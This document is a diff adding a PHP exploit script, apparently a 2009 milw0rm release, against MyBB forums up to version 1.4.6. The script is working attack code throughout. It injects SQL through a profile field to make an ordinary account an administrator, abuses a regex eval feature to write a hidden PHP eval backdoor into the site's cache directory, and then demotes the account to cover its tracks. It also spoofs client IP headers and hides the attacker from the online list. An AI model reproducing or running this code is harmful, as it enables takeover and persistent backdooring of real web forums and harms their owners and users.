@@ -1,0 +1,431 @@
+<?PHP
+/*
+
+Someone decided to contact mybb's staff informing about this vulnerability with the obvious result that this will not work anymore. 
+Fucking moron.
+
+I'm releasing a non-finished version of the exploit. No help, PoC and with the necessity of --admindir flag.
+Going to update it in the next days.
+For historical reason, i'm leaving the original title, but note that is <= 1.4.6
+
+
+Example:
+
+paradox@d3b14n:~/Files/Exploit-Pocs/My_Exploit/Remote/Mybb$ php myBBtomilw0rm.php -u anybody -p qwerty -t http://localhost/web/mybb/Upload/ --admindir /admin/
+[.] Initialing.
+[+] Logged in.
+[+] my_post_key variable found.
+[+] Turned On mybb's invisible mode.
+[+] Sql code injected. You're now admin.
+[+] Admindir found (or --admindir is used): /admin/.
+[+] Admin sid Found: 824e26b4221673a0f213c37f87b9ccd7
+[+] Site correctly backdoored.
+[+] Sql code injected. You're now user.
+[+] Backdoor URI: http://localhost/web/mybb/Upload//cache/themes/themes.php
+All Done. The:Paradox hopes you used this exploit exclusively for your own fun and you enjoyed it.
+Have a nice day :P
+
+
+For the curious people: http://mybboard.it/forum/thread-3623.html
+
+*/
+
+/*
+
+Mybb <= 1.4.4 Remote Code Execution through Sql Injection Exploit
+
+
+Discovered: 	About 4 days before the exploit was coded.
+Coded:		03-03-2009 
+Author:		The:Paradox
+Release:	Not yet. 
+
+No php.ini setting can stop us ! =O 
+A user (not email confirmed too) is needed.
+
+Keep private or your keyboard will blew up.
+
+
+*/
+
+
+$mybb = new maibibi2;
+
+
+class maibibi2 
+{
+
+	function __construct ()
+	{
+
+
+
+		$this->user	= $this->get_argv('-u');
+		$this->pass	= $this->get_argv('-p');
+		$this->target	= $this->get_argv('-t');
+		$this->admindir	= $this->get_argv('--admindir');	
+		$this->oa2u	= $this->get_argv('--onlyadmin2user');
+
+		$this->ip	= '67.167.124.135';
+		$this->ua	= 'Mozilla 5.0';
+		$this->bckdr	= '/cache/themes/themes.php';
+
+		if ($this->get_argv('--help') !== False || $this->get_argv('-h') !== False)	$this->help();
+		if (!$this->user || !$this->pass)						die ("You have to insert User/Password\r\nUse --help or -h for more informations.\r\n");
+		if (!$this->target)								die ("You have to insert Target\r\nUse --help or -h for more informations.\r\n");
+			
+		$this->http();
+		$this->init();
+
+			
+	}
+
+	function help ()
+	{
+
+		die ("Under Construction\r\n");
+
+	}
+
+	function get_argv ($what)
+	{
+		global $argv;
+
+		if (!$n = array_search($what, $argv)) return False;
+		return $argv[$n+1];	
+	}
+
+	function init ()
+	{
+
+		set_time_limit(0); // about 30 seconds left? Be serious.
+
+		echo "[.] Initialing.\r\n";
+
+			if (!$this->mybbuser = $this->ilovecookies ()) die ("Incorrect credentials.\r\n");
+
+		echo "[+] Logged in.\r\n";
+
+			if (!$this->mypostkey = $this->getmypostkey())  die ("My_Post_Key Not Found.\r\n");
+
+		echo "[+] my_post_key variable found.\r\n";
+
+			$this->hidemefromonlinelist();
+
+		echo "[+] Turned On mybb's invisible mode.\r\n";
+
+			$this->user2admin();
+
+		echo "[+] Sql code injected. You're now admin.\r\n";
+
+			if (!$this->admindir && !$this->admindir = $this->findadmindir()) die ("Unable to find admin Dir.\r\nWhatever it's possible your user is currently an administrator.\r\nIf you know admin dir path, you may use --admindir\r\n");
+
+		echo "[+] Admindir found (or --admindir is used): {$this->admindir}.\r\n";		
+
+			if (!$this->adminsid = $this->loginadmin())  die ("[-] Unable to login as admin.\r\nWhatever it's possible your user is currently an administrator.\r\n");
+		
+		echo "[+] Admin sid Found: {$this->adminsid}\r\n";		
+			#$this->writabledirs();
+			$this->rce ();		
+			if (!$this->checkrce ()) die ("Unable to Execute PHP Code.\r\nWhatever it's possible your user is currently an administrator.\r\n");
+
+		echo "[+] Site correctly backdoored.\r\n";
+
+			$this->admin2user();
+
+		echo "[+] Sql code injected. You're now user.\r\n";
+		echo "[+] Backdoor URI: {$this->target}{$this->bckdr}\r\n";
+		echo "All Done. The:Paradox hopes you used this exploit exclusively for your own fun and you enjoyed it.\r\nHave a nice day :P\r\n\r\n";
+
+	}	
+
+	function ilovecookies ()
+	{
+		$this->header = array ('client-ip' => $this->ip ,'User-Agent' => $this->ua);
+		$this->postdata = array ('username' => $this->user, 'password' => $this->pass, 'submit' => 'Login', 'action' => 'do_login');
+		
+		$rsp = $this->post ("{$this->target}/member.php");
+		
+		if (!preg_match_all ('~mybbuser=(.+?);~',$rsp,$res)) return False;
+
+		return $res[1][0];
+		
+
+	}
+
+	function getmypostkey ()
+	{
+
+		$this->header = array ('client-ip' => $this->ip ,'User-Agent' => $this->ua, 'Referer' => "{$this->target}/member.php", 'Cookie' => "mybbuser={$this->mybbuser};");
+		$rsp = $this->get ("{$this->target}/usercp.php?action=profile");
+
+		if (!preg_match_all ('~name="my_post_key" value="(.+?)" />~',$rsp,$res)) return False;
+
+		return $res[1][0];				
+
+	}
+
+	function hidemefromonlinelist()
+
+	{
+		$this->header = array ('client-ip' => $this->ip ,'User-Agent' => $this->ua, 'Referer' => "{$this->target}/usercp.php?action=profile", 'Cookie' => "mybbuser={$this->mybbuser};");
+		$this->postdata = array ('my_post_key' => $this->mypostkey, 'invisible' => '1', 'action' => 'do_options', 'regsubmit' => 'Update+Options');
+		
+		$rsp = $this->post ("{$this->target}/member.php");
+		
+	}
+
+	function user2admin ()
+
+	{
+
+		$this->header = array ('client-ip' => $this->ip ,'User-Agent' => $this->ua, 'Referer' => "{$this->target}/usercp.php?action=profile", 'Cookie' => "mybbuser={$this->mybbuser};");
+		$this->postdata = array ('my_post_key'			 => $this->mypostkey, 
+					'invisible'			=> '1', 
+					'bday1'				=> '', 
+					'bday2'				=> '', 
+					'bday3'				=> '', 
+					'website'			=> 'http%3A%2F%2F', 
+					'profile_fields%5Bfid3%5D'	=> 'Undisclosed', 
+					'profile_fields%5Bfid2%5D'	=> 'Undisclosed',
+					'profile_fields%5Bfid1%5D'	=> 'Undisclosed', 
+					'usertitle'			=> '',
+					'icq'				=> '', 
+					'aim'				=> '', 
+					'msn'				=> '', 
+					'yahoo'				=> '', 
+					'away'				=> '0', 
+					'awayreason'			=> '', 
+					'awayday'			=> '', 
+					'awaymonth'			=> '',
+					'awayyear'			=> '',
+					'birthdayprivacy'		=> "all', usergroup=4, email='pr3sident@whit3house.gov',regip='79.140.81.83', longregip='1334595923', lastip='', longlastip='",
+					'action'			=> 'do_profile', 
+					'regsubmit'			=> '1');
+
+		$rsp = $this->post ("{$this->target}/usercp.php");
+
+	}
+	
+	function findadmindir ()
+	{
+
+		$this->header = array ('client-ip' => $this->ip ,'User-Agent' => $this->ua, 'Referer' => "{$this->target}/usercp.php?action=profile", 'Cookie' => "mybbuser={$this->mybbuser};");
+		$rsp = $this->get("{$this->target}/index.php");
+
+
+		if (!preg_match_all ("~<!-- start: header_welcomeblock_member_admin -->
+ &mdash; <a href=\"{$this->target}(.+?)/index.php\">~",$rsp,$res)) return False;
+
+		return $res[1][0];				
+
+
+
+	}
+
+	function loginadmin ()
+
+	{
+		
+		$this->header = array ('client-ip' => $this->ip ,'User-Agent' => $this->ua, 'Referer' => "{$this->target}/usercp.php?action=profile", 'Cookie' => "mybbuser={$this->mybbuser};");
+		$this->postdata = array ('username' => $this->user, 'password' => $this->pass, 'do' => 'login');
+
+		$rsp = $this->post ("{$this->target}/{$this->admindir}/index.php");
+		
+		if (!preg_match_all ('~adminsid=(.+?);~',$rsp,$res)) return False;
+
+		return $res[1][0];
+	}
+
+	function writabledirs ()
+	{
+		$this->header = array ('client-ip' => $this->ip ,'User-Agent' => $this->ua, 'Referer' => "{$this->target}/{$this->admindir}/index.php?", 'Cookie' => "mybbuser={$this->mybbuser}; adminsid={$this->adminsid};");
+		$this->get ("{$this->target}/{$this->admindir}/index.php?module=tools") ;
+
+
+	}
+
+
+	function rceOld ()
+
+	{
+
+	//edits inc/functions.php (original one)
+
+	$this->header = array ('client-ip' => $this->ip ,'User-Agent' => $this->ua, 'X-Requested-With' => 'XMLHttpRequest', 'Referer' => "{$this->target}/{$this->admindir}/index.php?module=config/mycode&action=edit&cid=1", 'Cookie' => "mybbuser={$this->mybbuser}; adminsid={$this->adminsid};");
+	$this->postdata = array ('my_post_key'			 => $this->mypostkey, 
+					'o_o'				=> 'phpinfo();', 
+					'regex'				=> '(.*%3F)#e%00', 
+					'replacement'			=> 'die(eval(stripslashes($_REQUEST[\'o_o\'])));', 
+					'test_value'			=> 'XoD');
+
+	$rsp = $this->post ("{$this->target}/{$this->admindir}/index.php?module=config/mycode&action=xmlhttp_test_mycode");
+
+
+	}
+
+	function rce ()
+
+	{
+
+	$this->header = array ('client-ip' => $this->ip ,'User-Agent' => $this->ua, 'X-Requested-With' => 'XMLHttpRequest', 'Referer' => "{$this->target}/{$this->admindir}/index.php?module=config/mycode&action=edit&cid=1", 'Cookie' => "mybbuser={$this->mybbuser}; adminsid={$this->adminsid};");
+	$this->postdata = array ('my_post_key'			 => $this->mypostkey, 
+					'o_o'				=> 'JGZwID0gZm9wZW4oJF9SRVFVRVNUWydmaWxlJ10sICdhJyk7DQpmd3JpdGUoJGZwLCAnPD9QSFAgaWYgKGlzc2V0KCRfUkVRVUVTVFt4XSkpIGV2YWwoc3RyaXBzbGFzaGVzKCRfUkVRVUVTVFt4XSkpOyA/PicpOw0KZmNsb3NlKCRmcCk7', 
+					'regex'				=> '(.*%3F)#e%00', 
+					'replacement'			=> 'die(eval(base64_decode($_REQUEST[\'o_o\'])));', 
+					'test_value'			=> 'XoD',
+					'file'				=> "../{$this->bckdr}");
+
+	$rsp = $this->post ("{$this->target}/{$this->admindir}/index.php?module=config/mycode&action=xmlhttp_test_mycode");
+
+
+	}
+
+
+	function admin2user ()
+	
+	{
+
+		$this->header = array ('client-ip' => $this->ip ,'User-Agent' => $this->ua, 'Referer' => "{$this->target}/usercp.php?action=profile", 'Cookie' => "mybbuser={$this->mybbuser};");
+		$this->postdata = array ('my_post_key'			 => $this->mypostkey, 
+					'invisible'			=> '1', 
+					'bday1'				=> '', 
+					'bday2'				=> '', 
+					'bday3'				=> '', 
+					'website'			=> 'http%3A%2F%2F', 
+					'profile_fields%5Bfid3%5D'	=> 'Undisclosed', 
+					'profile_fields%5Bfid2%5D'	=> 'Undisclosed',
+					'profile_fields%5Bfid1%5D'	=> 'Undisclosed', 
+					'usertitle'			=> '',
+					'icq'				=> '', 
+					'aim'				=> '', 
+					'msn'				=> '', 
+					'yahoo'				=> '', 
+					'away'				=> '0', 
+					'awayreason'			=> '', 
+					'awayday'			=> '', 
+					'awaymonth'			=> '',
+					'awayyear'			=> '',
+					'birthdayprivacy'		=> "all', usergroup=2, email='pr3sident.whit3house@gmail.com',regip='79.140.81.83', longregip='1334595923', lastip='', longlastip='",
+					'action'			=> 'do_profile', 
+					'regsubmit'			=> '1');
+
+		$rsp = $this->post ("{$this->target}/usercp.php");
+
+	}
+
+	function checkrce_old ()
+
+	{
+		$this->header = array ('client-ip' => $this->ip ,'Cookie' => 'x=print \'.:31337:.\'%3B;');
+		$rsp = $this->get ("{$this->target}/{$this->admindir}/inc/functions.php?");
+
+		if (!strstr($rsp,'.:31337:.'))	return False;
+		else				return True;
+
+	}
+
+	function checkrce ()
+
+	{
+		$this->header = array ('client-ip' => $this->ip ,'Cookie' => 'x=print \'.:31337:.\'%3B;');
+		$rsp = $this->get ("{$this->target}/{$this->bckdr}");
+
+		if (!strstr($rsp,'.:31337:.'))	return False;
+		else				return True;
+
+	}
+
+
+	function http ($port = 80, $header = array(), $post = array(), $timeout = 30)
+	{
+
+		$this->port	= $port;
+		$this->timeout	= $timeout;
+		$this->header	= $header;
+		$this->postdata	= $post;
+	}
+
+	function get ($url)
+	{
+		$this->url = parse_url($url);
+		$this->packet = array();
+
+		$this->packet[] = "GET {$this->url['path']}?{$this->url['query']}{$this->url['fragment']} HTTP/1.1";
+		$this->packet[] = "Host: {$this->url['host']}";
+
+		foreach ($this->header as $header => $value)
+		{
+			$this->packet[] = "$header: $value";
+		}
+		
+		$this->packet[] = "\r\n\r\n"; 
+		$this->packet	= implode ("\r\n",$this->packet);
+
+		return $this->conn();
+	}
+
+	function post ($url)
+	{
+		$this->url = parse_url($url);
+
+		$this->packet = array();
+		$this->postcontent = '';
+
+		$this->packet[] = "POST {$this->url['path']}?{$this->url['query']}{$this->url['fragment']} HTTP/1.1";
+		$this->packet[] = "Host: {$this->url['host']}";
+
+		foreach ($this->header as $header => $value)
+		{
+			$this->packet[] = "$header: $value";
+		}
+	
+		foreach ($this->postdata as $post => $value)
+		{
+			if ($this->postcontent != '') $this->postcontent .= '&'; 
+			$this->postcontent .= "$post=$value";
+		}
+	
+		$this->packet[] = 'Content-Type: application/x-www-form-urlencoded';
+		$this->packet[] = "Content-Length: ".strlen($this->postcontent)."\r\n";
+		$this->packet[] = $this->postcontent;
+
+		$this->packet	= implode ("\r\n",$this->packet);
+
+		return $this->conn();
+	}
+
+
+	function conn()
+	{
+		if (!isset($this->url['port']))	$this->url['port'] = $this->port;
+
+		$sk = fsockopen ($this->url['host'], $this->url['port'], $eno, $estr, $this->timeout);
+
+		if (!is_resource($sk))	return "[-] Fsockopen Failed! Error: ".$estr." [".$eno."]" ;
+
+		else	{
+
+    				fputs($sk, $this->packet);
+				$rsp = "";
+				
+				while (!feof($sk)) 
+					{
+	       					$rsp .= fgets ($sk, 1024);
+					}
+			}
+
+		fclose($sk);
+		return $rsp;
+	}
+
+
+
+}
+
+
+
+
+?>
+
+# milw0rm.com [2009-06-22]
